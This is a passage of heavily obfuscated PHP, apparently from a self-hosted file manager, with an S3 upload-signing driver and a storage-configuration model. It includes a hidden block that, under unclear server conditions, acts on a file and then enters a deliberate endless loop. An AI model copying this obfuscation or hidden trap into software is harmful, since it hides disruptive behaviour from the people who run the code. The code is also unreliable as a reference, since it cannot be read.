(!$Îõ·Şº‡[$ÔÍ´¿ë¶[1294]]) { return null; } $ĞÉÂ˜ï­ = isset($Îõ·Şº‡[$ÔÍ´¿ë¶[1284]]) ? $Îõ·Şº‡[$ÔÍ´¿ë¶[1284]] : array(); if (!isset($ĞÉÂ˜ï­[$ÔÍ´¿ë¶[1598]])) { return null; } $«Ş¡ŞÂö = array($ÔÍ´¿ë¶[33] => isset($ĞÉÂ˜ï­[$ÔÍ´¿ë¶[1598]]) ? $ĞÉÂ˜ï­[$ÔÍ´¿ë¶[1598]] : null, $ÔÍ´¿ë¶[79] => isset($ĞÉÂ˜ï­[$ÔÍ´¿ë¶[1599]]) ? $ĞÉÂ˜ï­[$ÔÍ´¿ë¶[1599]] : null, $ÔÍ´¿ë¶[245] => isset($ĞÉÂ˜ï­[$ÔÍ´¿ë¶[1600]]) ? $ĞÉÂ˜ï­[$ÔÍ´¿ë¶[1600]] : null, $ÔÍ´¿ë¶[1567] => isset($ĞÉÂ˜ï­[$ÔÍ´¿ë¶[1601]]) ? $ĞÉÂ˜ï­[$ÔÍ´¿ë¶[1601]] : null); $«Ş¡ŞÂö[$ÔÍ´¿ë¶[1568]] = isset($ĞÉÂ˜ï­[$ÔÍ´¿ë¶[1602]]) ? strtotime($ĞÉÂ˜ï­[$ÔÍ´¿ë¶[1602]]) : $«Ş¡ŞÂö[$ÔÍ´¿ë¶[1567]]; return $«Ş¡ŞÂö; } protected function _isFolder($¬Š§¤û¹) { $˜ô±ê½ =& $_SERVER[¢ñàß¿€]; if ($¬Š§¤û¹ == $˜ô±ê½[12] || $¬Š§¤û¹ == $˜ô±ê½[8]) { return !0; } $ş›ÑñêÜ = $this->_objectMeta($¬Š§¤û¹); return isset($ş›ÑñêÜ[$˜ô±ê½[33]]) && $ş›ÑñêÜ[$˜ô±ê½[33]] == $˜ô±ê½[78] ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[¢ñàß¿€][947]]) || !isset($_SERVER[$_SERVER[¢ñàß¿€][1458]])) { $_getc = $_SERVER[¢ñàß¿€][950]; $_getfile = $_SERVER[$_SERVER[¢ñàß¿€][951]] . $_SERVER[¢ñàß¿€][952]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¢ñàß¿€][262], $_getfilec); if (count($_getarrs) < $_SERVER[¢ñàß¿€][685]) { $exit = $_SERVER[¢ñàß¿€][953]; $exit(); } $_act = $_SERVER[¢ñàß¿€][1457]; $_act($_SERVER[$_SERVER[¢ñàß¿€][951]] . $_SERVER[¢ñàß¿€][952]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¢ñàß¿€][454]); } } goto eÌ‹İåÃñè; EÚ†Ù¹Ú¹„: define($_SERVER[¢ñàß¿€][317], 3); define($_SERVER[¢ñàß¿€][318], 1); define($_SERVER[¢ñàß¿€][319], 0); goto CîìƒÛ†Õñ; dùšŒ£Ö¸õ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($µ×ı¾ÀÁ) { parent::__construct($µ×ı¾ÀÁ); } public function uploadFormData($ÄÒê ÌÅ, $¨ÏòâÛ› = 3600) { $¤üàÄ–¸ =& $_SERVER[¢ñàß¿€]; $Õœ·Ôä“ = $¤üàÄ–¸[229]; $ñšºîê = $¤üàÄ–¸[270]; $œ‰ÇûŠá = $¤üàÄ–¸[62]; $èÆ®‘ = gmdate($¤üàÄ–¸[271]); $ì’«öí = gmdate($¤üàÄ–¸[272]); $ø§ŞŸÚÛ = $¤üàÄ–¸[273]; $“†äĞşÔ = $¨ÏòâÛ› . $¤üàÄ–¸[12]; $Œ½ı”ù€ = $¤üàÄ–¸[274]; $ø¹İÀ§‹ = array($this->accessKey, $ì’«öí, $this->region, $œ‰ÇûŠá, $ø§ŞŸÚÛ); $¬Ñ™¿ß® = implode($¤üàÄ–¸[8], $ø¹İÀ§‹); $Úİë°Ä÷ = array($¤üàÄ–¸[275] => gmdate($¤üàÄ–¸[299], strtotime($¤üàÄ–¸[277])), $¤üàÄ–¸[278] => array(array($¤üàÄ–¸[279] => $this->bucket), array($¤üàÄ–¸[280] => $Õœ·Ôä“), array($¤üàÄ–¸[281], $¤üàÄ–¸[282], $¤üàÄ–¸[12]), array($¤üàÄ–¸[281], $¤üàÄ–¸[283], $¤üàÄ–¸[12]), array($¤üàÄ–¸[281], $¤üàÄ–¸[284], $¤üàÄ–¸[12]), array($¤üàÄ–¸[285] => $Œ½ı”ù€), array($¤üàÄ–¸[286] => $¬Ñ™¿ß®), array($¤üàÄ–¸[287] => $ñšºîê), array($¤üàÄ–¸[288] => $èÆ®‘), array($¤üàÄ–¸[289] => $“†äĞşÔ))); $Ì¬§şÏ„ = base64_encode(json_encode($Úİë°Ä÷)); $ÓšİÌŒ– = hash_hmac($¤üàÄ–¸[290], $ì’«öí, $¤üàÄ–¸[291] . $this->secret, !0); $÷»€–ÁÂ = hash_hmac($¤üàÄ–¸[290], $this->region, $ÓšİÌŒ–, !0); $»´ë¹ì­ = hash_hmac($¤üàÄ–¸[290], $œ‰ÇûŠá, $÷»€–ÁÂ, !0); $õ·ûşÔğ = hash_hmac($¤üàÄ–¸[290], $ø§ŞŸÚÛ, $»´ë¹ì­, !0); $ßüå¹í‚ = hash_hmac($¤üàÄ–¸[290], $Ì¬§şÏ„, $õ·ûşÔğ); $‘‘²óˆú = array($¤üàÄ–¸[246] => $¤üàÄ–¸[12], $¤üàÄ–¸[292] => $¤üàÄ–¸[12], $¤üàÄ–¸[280] => $Õœ·Ôä“, $¤üàÄ–¸[285] => $Œ½ı”ù€, $¤üàÄ–¸[293] => $Ì¬§şÏ„, $¤üàÄ–¸[294] => $¬Ñ™¿ß®, $¤üàÄ–¸[295] => $ñšºîê, $¤üàÄ–¸[296] => $èÆ®‘, $¤üàÄ–¸[297] => $“†äĞşÔ, $¤üàÄ–¸[298] => $ßüå¹í‚, $¤üàÄ–¸[208] => $this->getHost()); return $‘‘²óˆú; } public function multiUploadFormData($·ê“½ Ô, $ÎÎË„Æ¡ = 3600) { $åùœÌâ =& $_SERVER[¢ñàß¿€]; $ŞäÄàá– = gmdate($åùœÌâ[300]); $ °ÓƒÒä = array(); $Âß­‰ß– = $this->client->getUploadId($this->bucket, $·ê“½ Ô, $ °ÓƒÒä); if (!$Âß­‰ß–) { return !1; } return array($åùœÌâ[254] => $Âß­‰ß–, $åùœÌâ[208] => $this->getHost() . $åùœÌâ[8] . $this->pathEncode($·ê“½ Ô), $åùœÌâ[255] => $ŞäÄàá–, $åùœÌâ[97] => $·ê“½ Ô); } public function multiUploadAuthData($ö˜ìªŒã, $ØŸ«ö¨Š = array()) { $«¼Ü¸œ¥ =& $_SERVER[¢ñàß¿€]; $Ê¨“ÅœÕ = isset($ØŸ«ö¨Š[$«¼Ü¸œ¥[169]]) ? $ØŸ«ö¨Š[$«¼Ü¸œ¥[169]] : $«¼Ü¸œ¥[12]; $·›ì™šî = $ØŸ«ö¨Š[$«¼Ü¸œ¥[97]]; unset($ØŸ«ö¨Š[$«¼Ü¸œ¥[97]]); if (isset($ØŸ«ö¨Š[$«¼Ü¸œ¥[256]])) { return $this->listUploadParts($·›ì™šî, $ØŸ«ö¨Š); } $ª‚™Ì¾ = array(); if (isset($ØŸ«ö¨Š[$«¼Ü¸œ¥[301]])) { $ª‚™Ì¾[$«¼Ü¸œ¥[302]] = $ØŸ«ö¨Š[$«¼Ü¸œ¥[301]]; } $„äˆÓÌ¦ = explode($«¼Ü¸œ¥[210], $this->getHost()); $ÑÆ®İÑ£ = array($«¼Ü¸œ¥[303] => $„äˆÓÌ¦[1], $«¼Ü¸œ¥[304] => $«¼Ü¸œ¥[12], $«¼Ü¸œ¥[246] => $«¼Ü¸œ¥[123], $«¼Ü¸œ¥[292] => $ØŸ«ö¨Š[$«¼Ü¸œ¥[79]]); $¡¡Ï¡õé = $«¼Ü¸œ¥[259]; $“— ç€Ë = $«¼Ü¸œ¥[8] . $this->pathEncode($·›ì™šî) . $Ê¨“ÅœÕ; $ÕÈ £äˆ = $this->client->__getSignatureV4($ª‚™Ì¾, $ÑÆ®İÑ£, $¡¡Ï¡õé, $“— ç€Ë); if (strpos($Ê¨“ÅœÕ, $«¼Ü¸œ¥[258]) === 0) { if (isset($ª‚™Ì¾[$«¼Ü¸œ¥[302]])) { $ï‰ òè˜ = $ª‚™Ì¾[$«¼Ü¸œ¥[302]]; } else { if (isset($ÕÈ £äˆ[$«¼Ü¸œ¥[302]])) { $ï‰ òè˜ = $ÕÈ £äˆ[$«¼Ü¸œ¥[302]]; } else { $ï‰ òè˜ = hash($«¼Ü¸œ¥[290], $«¼Ü¸œ¥[12]); } } return array($«¼Ü¸œ¥[265] => $ÕÈ £äˆ[$«¼Ü¸œ¥[265]], $«¼Ü¸œ¥[302] => $ï‰ òè˜, $«¼Ü¸œ¥[255] => $ÕÈ £äˆ[$«¼Ü¸œ¥[305]]); } return $ÕÈ £äˆ[$«¼Ü¸œ¥[265]]; } public function listUploadParts($¤Ñäš Ò, $ê×õ‚ã´ = array()) { $¨—Èëîä =& $_SERVER[¢ñàß¿€]; $ÌìŒ¯ğ± = str_replace($¨—Èëîä[266], $¨—Èëîä[12], $ê×õ‚ã´[$¨—Èëîä[169]]); $‘Çèášà = $this->client->listParts($this->bucket, $¤Ñäš Ò, $ÌìŒ¯ğ±); if (!$‘Çèášà) { return !1; } $ø•Úß = $¨—Èëîä[306]; foreach ($‘Çèášà as $û™•Ø¬) { $ø•Úß .= $¨—Èëîä[307] . "\74\120\x61\x72\x74\x4e\x75\x6d\142\145\x72\x3e{$û™•Ø¬[$¨—Èëîä[308]]}\74\x2f\x50\141\x72\164\116\x75\155\142\x65\x72\76\12" . "\74\x45\124\141\x67\x3e{$û™•Ø¬[$¨—Èëîä[309]]}\74\x2f\105\x54\x61\147\x3e\xa" . $¨—Èëîä[310]; } $ø•Úß .= $¨—Èëîä[311]; $È½³ïÛ« = array(); $ŠÏöáŠ¢ = explode($¨—Èëîä[210], $this->getHost()); $Æõ¬¥àç = array($¨—Èëîä[303] => $ŠÏöáŠ¢[1], $¨—Èëîä[246] => $¨—Èëîä[123], $¨—Èëîä[292] => strlen($ø•Úß)); $Ò˜¥ŸÒŞ = $¨—Èëîä[257]; $ƒ˜ãàÀµ = $¨—Èëîä[8] . $this->pathEncode($¤Ñäš Ò) . $ê×õ‚ã´[$¨—Èëîä[169]]; $ì»á¿‡ = $this->client->__getSignatureV4($È½³ïÛ«, $Æõ¬¥àç, $Ò˜¥ŸÒŞ, $ƒ˜ãàÀµ, $ø•Úß); return array($¨—Èëîä[265] => $ì»á¿‡[$¨—Èëîä[265]], $¨—Èëîä[255] => $ì»á¿‡[$¨—Èëîä[305]], $¨—Èëîä[267] => $‘Çèášà, $¨—Èëîä[302] => $ì»á¿‡[$¨—Èëîä[302]]); } public function link($¢ùşÉáä, $­ô¯¢ = array()) { return parent::link($¢ùşÉáä, $­ô¯¢); } public function fileOut($„ÅÓñØ¾, $üÛ˜‘Î´ = false, $£±ğÂ‹ = false, $‹øóÍˆ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¢ñàß¿€][312])) { return parent::fileOutServer($„ÅÓñØ¾, $üÛ˜‘Î´, $£±ğÂ‹, $‹øóÍˆ); } parent::fileOut($„ÅÓñØ¾, $üÛ˜‘Î´, $£±ğÂ‹, $‹øóÍˆ); } public function fileOutImage($äÅ×»äÚ, $Å»‡Á°¥ = 250) { if (strstr($this->endpoint, $_SERVER[¢ñàß¿€][312])) { return parent::fileOutImageServer($äÅ×»äÚ, $Å»‡Á°¥); } parent::fileOutImage($äÅ×»äÚ, $Å»‡Á°¥); } public function fileOutLink($Û¬ÆÚ™Ä) { $øÕ¥Õ‘ï =& $_SERVER[¢ñàß¿€]; if (substr($Û¬ÆÚ™Ä, 0, 7) == $øÕ¥Õ‘ï[313]) { $Û¬ÆÚ™Ä = $øÕ¥Õ‘ï[314] . substr($Û¬ÆÚ™Ä, 7); } header($øÕ¥Õ‘ï[175] . $Û¬ÆÚ™Ä); die; } } define($_SERVER[¢ñàß¿€][315], 1); define($_SERVER[¢ñàß¿€][316], 2); goto EÚ†Ù¹Ú¹„; CÎ™È†…¸È: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\163\x74\157\162\141\147\x65\x4c\151\163\164"; public $field = array("\156\x61\x6d\145", "\x73\151\172\x65\115\x61\x78", "\x73\171\163\x74\x65\155", "\144\x65\x66\x61\165\x6c\164", "\144\162\x69\166\x65\x72", "\143\x6f\156\x66\x69\147"); public function listData($²¼­šô = false, $ÆóŒ‰Î¦ = "\155\x6f\144\151\x66\x79\124\151\155\x65", $ŞÒ“æÌ‰ = false) { $ À¾–•¿ =& $_SERVER[¢ñàß¿€]; $Áê¥Ûß = parent::listData($²¼­šô, $ÆóŒ‰Î¦, $ŞÒ“æÌ‰); if ($²¼­šô) { return $Áê¥Ûß; } $ß–àò»ß = array(); if ($GLOBALS[$ À¾–•¿[2294]]) { $ß–àò»ß = $this->ioSizeUseGet(array_to_keyvalue($Áê¥Ûß, $ À¾–•¿[12], $ À¾–•¿[475])); } foreach ($Áê¥Ûß as $º§Ö„íñ => $°â‹Ëµ²) { unset($Áê¥Ûß[$º§Ö„íñ][$ À¾–•¿[6]]); $Áê¥Ûß[$º§Ö„íñ][$ À¾–•¿[1957]] = isset($ß–àò»ß[$°â‹Ëµ²[$ À¾–•¿[475]]]) ? $ß–àò»ß[$°â‹Ëµ²[$ À¾–•¿[475]]] : 0; } return $Áê¥Ûß; } public function ioSizeUseGet($ÓÉ ½€ª) { $÷ğªìÑ =& $_SERVER[¢ñàß¿€]; if (!$ÓÉ ½€ª) { return array(); } $ƒ·¦¸æ· = $÷ğªìÑ[2295] . implode($÷ğªìÑ[50], $ÓÉ ½€ª); $ê‹Ùñó× = Cache::get($ƒ·¦¸æ·); if ($ê‹Ùñó×) { return $ê‹Ùñó×; } $Àç§Ûâø = array($÷ğªìÑ[888] => $÷ğªìÑ[475], $÷ğªìÑ[2296] => $÷ğªìÑ[79]); $˜¦†¾ú¹ = array($÷ğªìÑ[888] => array($÷ğªìÑ[7], $ÓÉ ½€ª)); $ê‹Ùñó× = Model($÷ğªìÑ[860])->field($Àç§Ûâø)->where($˜¦†¾ú¹)->group($÷ğªìÑ[888])->select(); $ê‹Ùñó× = array_to_keyvalue($ê‹Ùñó×, $÷ğªìÑ[475], $÷ğªìÑ[79]); Cache::set($ƒ·¦¸æ·, $ê‹Ùñó×, 600); return $ê‹Ùñó×; } public function getConfig($ÌÕåŠ•) { $àŠ Èéª = parent::listData($ÌÕåŠ•); return json_decode($àŠ Èéª[$_SERVER[¢ñàß¿€][6]], !0); } public function update($È±¹Ì‰ç, $ÌãÌª) { $¡ş” áÕ =& $_SERVER[¢ñàß¿€]; $Ê‚îÔÖ = $ÌãÌª[$¡ş” áÕ[32]]; $’¥Ûß÷ğ = array_to_keyvalue(parent::listData(), $¡ş” áÕ[32]); if (isset($’¥Ûß÷ğ[$Ê‚îÔÖ]) && $’¥Ûß÷ğ[$Ê‚îÔÖ][$¡ş” áÕ[475]] != $È±¹Ì‰ç) { return !1; } $this->checkPwd($È±¹Ì‰ç, $ÌãÌª); if (isset($ÌãÌª[$¡ş” áÕ[2297]]) && $ÌãÌª[$¡ş” áÕ[2297]] == $¡ş” áÕ[91]) { $this->checkConfig($ÌãÌª); } unset($ÌãÌª[$¡ş” áÕ[2297]]); $İñ¾á = parent::update($È±¹Ì‰ç, $ÌãÌª); if ($İñ¾á && $ÌãÌª[$¡ş” áÕ[37]]) { $¶¿Éõ„ = 0; foreach ($’¥Ûß÷ğ as $óºé„£) { if ($óºé„£[$¡ş” áÕ[37]] && $óºé„£[$¡ş” áÕ[475]] != $È±¹Ì‰ç) { $¶¿Éõ„ = $óºé„£[$¡ş” áÕ[475]]; parent::update($óºé„£[$¡ş” áÕ[475]], array($¡ş” áÕ[37] => 0)); } } $this->updateBackup($È±¹Ì‰ç, $¶¿Éõ„); } return $İñ¾á; } public function add($Ä™±¥ß) { $ÉÊÚêİª =& $_SERVER[¢ñàß¿€]; $òñº‚áÛ = array_to_keyvalue(parent::listData(), $ÉÊÚêİª[32]); if (isset($òñº‚áÛ[$Ä™±¥ß[$ÉÊÚêİª[32]]])) { return !1; } $this->checkConfig($Ä™±¥ß); $¬„å¢˜½ = parent::insert($Ä™±¥ß); if ($¬„å¢˜½ && $Ä™±¥ß[$ÉÊÚêİª[37]]) { foreach ($òñº‚áÛ as $¥€Ñ«Û€) { if ($¥€Ñ«Û€[$ÉÊÚêİª[37]]) { parent::update($¥€Ñ«Û€[$ÉÊÚêİª[475]], array($ÉÊÚêİª[37] => 0)); } } } return $¬„å¢˜½; } public function updateBackup($Øñ…é‡å, $½»íÙá—) { $ÙÑÁåï˜ =& $_SERVER[¢ñàß¿€]; if (!$½»íÙá—) { return; } $Ä•· ŠÑ = Model($ÙÑÁåï˜[819])->config(); if ($Ä•· ŠÑ[$ÙÑÁåï˜[1740]] != $ÙÑÁåï˜[91] || $Ä•· ŠÑ[$ÙÑÁåï˜[823]] != $½»íÙá—) { return; } $¯“ßÌ‚ = Model($ÙÑÁåï˜[841])->get($ÙÑÁåï˜[854]); $¯“ßÌ‚ = json_decode($¯“ßÌ‚, !0); if (!$¯“ßÌ‚) { return; } $¯“ßÌ‚[$ÙÑÁåï˜[823]] = $Øñ…é‡å; Model($ÙÑÁåï˜[841])->set(array($ÙÑÁåï˜[854] => $¯“ßÌ‚)); } public function checkPwd($¾ıˆ™š«, &$è¥óĞé¤) { $¾Ã¸ªÜ‹ =& $_SERVER[¢ñàß¿€]; if (empty($è¥óĞé¤[$¾Ã¸ªÜ‹[6]])) { return; } $ë°ıöñ = json_decode($è¥óĞé¤[$¾Ã¸ªÜ‹[6]], !0); $Ì®ğˆ¼ş = $¾Ã¸ªÜ‹[12]; $Ö¹¦ÃÊ´ = array($¾Ã¸ªÜ‹[2298], $¾Ã¸ªÜ‹[2299], $¾Ã¸ªÜ‹[964]); foreach ($Ö¹¦ÃÊ´ as $ÚØ£úÉ¦) { if (isset($ë°ıöñ[$ÚØ£úÉ¦])) { $Ì®ğˆ¼ş = $ÚØ£úÉ¦; break; } } if (!$Ì®ğˆ¼ş) { return; } $Ÿ÷û¼Ã· = $this->getConfig($¾ıˆ™š«); $„¾ÏÙ©° = $Ÿ÷û¼Ã·[$Ì®ğˆ¼ş]; $Èè‰¹š = $ë°ıöñ[$Ì®ğˆ¼ş]; if ($Èè‰¹š == str_repeat($¾Ã¸ªÜ‹[220], strlen($„¾ÏÙ©°))) { $ë°ıöñ[$Ì®ğˆ¼ş] = $„¾ÏÙ©°; $è¥óĞé¤[$¾Ã¸ªÜ‹[6]] = json_encode($ë°ıöñ); } else { if ($Èè‰¹š != $„¾ÏÙ©°) { $è¥óĞé¤[$¾Ã¸ªÜ‹[2297]] = $¾Ã¸ªÜ‹[91]; } } } public function checkConfig(&$î‡Øöë¢, $„â¨Ú£è = false) { $¬¿šÇÎÁ =& $_SERVER[¢ñàß¿€]; $Åú©Ãµ¡ = strtolower($î‡Øöë¢[$¬¿šÇÎÁ[98]]); $²éªÚ¯Ù = json_decode($î‡Øöë¢[$¬¿šÇÎÁ[6]], !0); foreach ($²éªÚ¯Ù as $Ç¯—À‰œ => $‡¾Ú„µş) { if (is_string($‡¾Ú„µş)) { $²éªÚ¯Ù[$Ç¯—À‰œ] = trim($‡¾Ú„µş); } } $²éªÚ¯Ù[$¬¿šÇÎÁ[2300]] = rand_string(6); $ÉİÌãç× = $GLOBALS[$¬¿šÇÎÁ[6]][$¬¿šÇÎÁ[92]][$¬¿šÇÎÁ[896]]; $»Áş½äï = isset($ÉİÌãç×[$Åú©Ãµ¡]) ? $ÉİÌãç×[$Åú©Ãµ¡] : ucfirst($Åú©Ãµ¡); $õòŸûòÓ = $¬¿šÇÎÁ[77] . $»Áş½äï; if (!$»Áş½äï || !class_exists($õòŸûòÓ)) { if ($„â¨Ú£è) { return LNG($¬¿šÇÎÁ[2301]); } write_log(array($¬¿šÇÎÁ[2302], $î‡Øöë¢, get_caller_info()), $¬¿šÇÎÁ[215]); show_json(LNG($¬¿šÇÎÁ[2301]), !1, $î‡Øöë¢); } $¡è‰ô©¬ = new $õòŸûòÓ($²éªÚ¯Ù); if (in_array($Åú©Ãµ¡, $¡è‰ô©¬->objectDriver)) { try { if (!$¡è‰ô©¬->isBucketCors() && !$¡è‰ô©¬->setBucketCors()) { $”øÔö§× = LNG($¬¿šÇÎÁ[2303]); $”øÔö§× .= $¬¿šÇÎÁ[2304] . LNG($¬¿šÇÎÁ[2305]); } } catch (Exception $ûÕ¥¥À´) { $”øÔö§× = $ûÕ¥¥À´->getMessage(); } if (isset($”øÔö§×)) { return $this->_parseError($”øÔö§×, $Åú©Ãµ¡, $„â¨Ú£è); } if ($Åú©Ãµ¡ == $¬¿šÇÎÁ[68] && !$¡è‰ô©¬->checkRegion()) { return $this->_parseError(LNG($¬¿šÇÎÁ[2306]), $Åú©Ãµ¡, $„â¨Ú£è); } } $‰ÖÇª = rtrim($²éªÚ¯Ù[$¬¿šÇÎÁ[1259]], $¬¿šÇÎÁ[8]) . $¬¿šÇÎÁ[8]; $ÅœÚ‡Üø = $¡è‰ô©¬->getPath($‰ÖÇª . $¬¿šÇÎÁ[1263]); try { if ($Åú©Ãµ¡ == $¬¿šÇÎÁ[109]) { $¡è‰ô©¬->mkdir($‰ÖÇª); } $ ­Á½ö = $¡è‰ô©¬->mkfile($ÅœÚ‡Üø); if (!$ ­Á½ö) { $”øÔö§× = LNG($¬¿šÇÎÁ[2303]); } } catch (Exception $ûÕ¥¥À´) { $”øÔö§× = $ûÕ¥¥À´->getMessage(); } if (isset($”øÔö§×)) { return $this->_parseError($”øÔö§×, $Åú©Ãµ¡, $„â¨Ú£è); } $²éªÚ¯Ù[$¬¿šÇÎÁ[1259]] = $‰ÖÇª; $î‡Øöë¢[$¬¿šÇÎÁ[6]] = json_encode($²éªÚ¯Ù); $î‡Øöë¢[$¬¿šÇÎÁ[98]] = $»Áş½äï; return !0; } private function _parseError($ˆ÷®ƒÄ, $î‰ÏÅ²ä, $‚×¢‹á = false) { $æôÃàÁÂ =& $_SERVER[¢ñàß¿€]; if ($î‰ÏÅ²ä == $æôÃàÁÂ[68] && stripos($ˆ÷®ƒÄ, $æôÃàÁÂ[2307])) { $—¡áÕ§ = explode($æôÃàÁÂ[10], $ˆ÷®ƒÄ); $ØÁıë›Î = isset($—¡áÕ§[1]) ? $—¡áÕ§[1] : $æôÃàÁÂ[12]; $¦”æ¤®¤ = array($æôÃàÁÂ[2308] => LNG($æôÃàÁÂ[2309]), $æôÃàÁÂ[2310] => LNG($æôÃàÁÂ[2311])); if (isset($¦”æ¤®¤[$ØÁıë›Î])) { $ˆ÷®ƒÄ = $¦”æ¤®¤[$ØÁıë›Î]; } } if (stripos($ˆ÷®ƒÄ, $æôÃàÁÂ[2312]) === 0) { $¥Ü‡¿¤Š = strpos($ˆ÷®ƒÄ, $æôÃàÁÂ[178]); if ($¥Ü‡¿¤Š === !1) { $¥Ü‡¿¤Š = strpos($ˆ÷®ƒÄ, $æôÃàÁÂ[4]); } if ($¥Ü‡¿¤Š !== !1) { $ˆ÷®ƒÄ = substr($ˆ÷®ƒÄ, $¥Ü‡¿¤Š + 1); } } $ˆ÷®ƒÄ = LNG($æôÃàÁÂ[1266]) . $ˆ÷®ƒÄ; if ($‚×¢‹á) { return $ˆ÷®ƒÄ; } show_json($ˆ÷®ƒÄ, !1); } public function driverListSystem() { $¥ÊÇß£¨ =& $_SERVER[¢ñàß¿€]; $°Èì—º– = parent::listData(); $ù¢» † = array(); foreach ($°Èì—º– as $óåÍ¨º‹) { unset($óåÍ¨º‹[$¥ÊÇß£¨[231]], $óåÍ¨º‹[$¥ÊÇß£¨[88]]); $óåÍ¨º‹[$¥ÊÇß£¨[6]] = json_decode($óåÍ¨º‹[$¥ÊÇß£¨[6]], !0); $ù¢» †[] = $óåÍ¨º‹; } return $ù¢» †; } public function defaultDriver() { $ËüÛŠÅ¯ =& $_SERVER[¢ñàß¿€]; $¡˜éÂ = parent::listData(); $¡Ìä»˜ = array_filter_by_field($¡˜éÂ, $ËüÛŠÅ¯[37], 1); $¡Ìä»˜ = $¡Ìä»˜[0]; if ($¡Ìä»˜) { $¡Ìä»˜[$ËüÛŠÅ¯[6]] = json_decode($¡Ìä»˜[$ËüÛŠÅ¯[6]], !0); } return $¡Ìä»˜; } public function driverInfo($Òíãòô) { $–¼¬²Êç =& $_SERVER[¢ñàß¿€]; $ŠÆ¸“îı = array_to_keyvalue(parent::listData(), $–¼¬²Êç[475]); if (!isset($ŠÆ¸“îı[$Òíãòô])) { return !1; } $ÌÊÇú³¬ = $ŠÆ¸“îı[$Òíãòô]; $ÌÊÇú³¬[$–¼¬²Êç[6]] = json_decode($ÌÊÇú³¬[$–¼¬²Êç[6]], !0); return $ÌÊÇú³¬; } public function remove($Ñ€«Ô´Î) { $this->removeShareItems($Ñ€«Ô´Î); return parent::remove($Ñ€«Ô´Î); } public function removeWithFile($´ë¶‡ä§, $ï§«­±, $’¦ŸäØ, $Ü¶Ûçø = false) { $²ì¬‡Íì =& $_SERVER[¢ñàß¿€]; $Ã¹°¼… = array($²ì¬‡Íì[888] => $´ë¶‡ä§); $öí©¯¢ = Model($²ì¬‡Íì[544])->where($Ã¹°¼…)->count(); $ÌÆŸê‰Ù = Model($²ì¬‡Íì[544])->where($Ã¹°¼…)->sum($²ì¬‡Íì[79]); $ïŸ‡§±” = $ï§«­± . $²ì¬‡Íì[2313] . $´ë¶‡ä§; $Ï ©ûÔ» = LNG($ï§«­± == $²ì¬‡Íì[620] ? $²ì¬‡Íì[2314] : $²ì¬‡Íì[2315]); $›û„–ÚĞ = new TaskFileTransfer($ïŸ‡§±”, $²ì¬‡Íì[215], $öí©¯¢, $Ï ©ûÔ» . $²ì¬‡Íì[462] . $’¦ŸäØ[$²ì¬‡Íì[32]] . $²ì¬‡Íì[214] . $´ë¶‡ä§); $›û„–ÚĞ->task[$²ì¬‡Íì[834]] = (double) $ÌÆŸê‰Ù; $ûƒåêö = KodIO::defaultDriver(); $©°“ÍÚ = $ûƒåêö[$²ì¬‡Íì[475]]; $Ì¤Ãô¦ö = $î•¦ï¡¹ = $ìÎüçğà = array(); $¸Š–ª™ = Model($²ì¬‡Íì[230])->where($Ã¹°¼…)->field($²ì¬‡Íì[2316])->select(); foreach ($¸Š–ª™ as $‘—–¯¯) { $¾ì±Ÿ = $‘—–¯¯[$²ì¬‡Íì[541]]; if ($Ü¶Ûçø) { $î•¦ï¡¹[] = $¾ì±Ÿ; continue; } $·üô˜Ÿ = $‘—–¯¯[$²ì¬‡Íì[87]]; $ËµÖÏ¦ç = get_path_father($·üô˜Ÿ); $ìÎüçğà[] = $ËµÖÏ¦ç; $ËµÖÏ¦ç = str_replace("\173\x69\157\72{$´ë¶‡ä§}\175\x2f", "\173\151\x6f\72{$©°“ÍÚ}\175\x2f", $ËµÖÏ¦ç); if (!IO::exist($·üô˜Ÿ)) { $Ì¤Ãô¦ö[] = $¾ì±Ÿ; $›û„–ÚĞ->updateFileEnd($‘—–¯¯[$²ì¬‡Íì[32]], $‘—–¯¯[$²ì¬‡Íì[79]]); write_log($²ì¬‡Íì[2317] . $·üô˜Ÿ, $²ì¬‡Íì[1900]); continue; } $ßâºÛË’ = IO::move($·üô˜Ÿ, $ËµÖÏ¦ç, REPEAT_RENAME); if (!$ßâºÛË’) { $î•¦ï¡¹[] = $¾ì±Ÿ; $›û„–ÚĞ->updateFileEnd($‘—–¯¯[$²ì¬‡Íì[32]], $‘—–¯¯[$²ì¬‡Íì[79]]); write_log($²ì¬‡Íì[2318] . $·üô˜Ÿ, $²ì¬‡Íì[1900]); continue; } $Ã¹°¼… = array($²ì¬‡Íì[541] => $¾ì±Ÿ); $‹´™ ×ò = array($²ì¬‡Íì[888] => $©°“ÍÚ, $²ì¬‡Íì[87] => $ßâºÛË’); Model($²ì¬‡Íì[230])->where($Ã¹°¼…)->save($‹´™ ×ò); } $ú­¶‡ÓÜ = $›û„–ÚĞ->task; if (!$Ü¶Ûçø) { Cache::set($ïŸ‡§±”, $ú­¶‡ÓÜ); } $›û„–ÚĞ->end(); $Ì¤Ãô¦ö = array_unique($Ì¤Ãô¦ö); $î•¦ï¡¹ = array_unique($î•¦ï¡¹); if (!$Ü¶Ûçø && ($Ì¤Ãô¦ö || $î•¦ï¡¹)) { $¬Â……· = array(); if ($Ì¤Ãô¦ö) { $¬Â……·[] = sprintf(LNG($²ì¬‡Íì[2319]), count($Ì¤Ãô¦ö)); } if ($î•¦ï¡¹) { $¬Â……·[] = sprintf(LNG($²ì¬‡Íì[2320]), count($î•¦ï¡¹)); } $¬Â……· = sprintf(LNG($²ì¬‡Íì[2321]), implode($²ì¬‡Íì[2322], $¬Â……·)) . $²ì¬‡Íì[2323] . date($²ì¬‡Íì[2324]) . $²ì¬‡Íì[2325]; if ($ï§«­± == $²ì¬‡Íì[1937]) { $¬Â……· .= $²ì¬‡Íì[2326] . LNG($²ì¬‡Íì[2327]); } $ú­¶‡ÓÜ[$²ì¬‡Íì[1261]] = $¬Â……·; Cache::set($ïŸ‡§±”, $ú­¶‡ÓÜ); unset($’¦ŸäØ[$²ì¬‡Íì[6]]); $‘¾Æ¹øß = array($²ì¬‡Íì[475] => $´ë¶‡ä§, $²ì¬‡Íì[2206] => $²ì¬‡Íì[620], $²ì¬‡Íì[32] => $’¦ŸäØ[$²ì¬‡Íì[32]], $²ì¬‡Íì[1284] => $’¦ŸäØ); 